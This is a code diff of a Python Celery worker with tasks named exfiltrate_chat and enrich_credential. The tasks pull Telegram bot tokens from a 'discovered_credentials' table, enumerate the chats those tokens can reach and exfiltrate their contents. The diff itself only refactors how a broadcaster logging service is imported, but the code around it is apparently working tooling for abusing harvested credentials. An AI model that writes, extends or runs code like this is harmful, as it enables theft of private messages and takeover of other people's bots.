@@ -4,7 +4,7 @@ from app.workers.celery_app import app
 from app.core.database import db
 from app.core.security import security
 from app.services.scraper_srv import scraper_service
-from app.services.broadcaster_srv import broadcaster_service
+# from app.services.broadcaster_srv import broadcaster_service # Local imports only
 import redis
 from app.core.config import settings
 import logging
@@ -32,7 +32,11 @@ def exfiltrate_chat(cred_id: str):
 
 async def _exfiltrate_logic(cred_id: str):
     logger.info(f"🕵️ [Exfil] Starting exfiltration for credential {cred_id}")
-    await broadcaster_service.send_log(f"🕵️ Starting exfiltration for CredID: `{cred_id}`")
+    
+    # Local instantiation for logging
+    from app.services.broadcaster_srv import BroadcasterService
+    broadcaster = BroadcasterService()
+    await broadcaster.send_log(f"🕵️ Starting exfiltration for CredID: `{cred_id}`")
     # Fetch credential
     response = db.table("discovered_credentials").select("bot_token, chat_id").eq("id", cred_id).execute()
     if not response.data:
@@ -106,7 +110,11 @@ def enrich_credential(cred_id: str):
 
 async def _enrich_logic(cred_id: str):
     logger.info(f"✨ [Enrich] Starting enrichment for credential {cred_id}")
-    await broadcaster_service.send_log(f"✨ Starting enrichment for CredID: `{cred_id}`")
+    
+    # Local instantiation for logging
+    from app.services.broadcaster_srv import BroadcasterService
+    broadcaster = BroadcasterService()
+    await broadcaster.send_log(f"✨ Starting enrichment for CredID: `{cred_id}`")
     # Fetch credential
     response = db.table("discovered_credentials").select("bot_token").eq("id", cred_id).execute()
     if not response.data:
@@ -129,9 +137,9 @@ async def _enrich_logic(cred_id: str):
         logger.info(f"✅ [Enrich] Discovery returned {len(chats) if chats else 0} chats.")
         if chats:
             chat_list = ", ".join([f"{c['name']} ({c['id']})" for c in chats])
-            await broadcaster_service.send_log(f"✅ Discovered chats: {chat_list}")
+            await broadcaster.send_log(f"✅ Discovered chats: {chat_list}")
         else:
-            await broadcaster_service.send_log("⚠️ No chats found.")
+            await broadcaster.send_log("⚠️ No chats found.")
     except Exception as e:
         return f"Discovery failed: {e}"
 
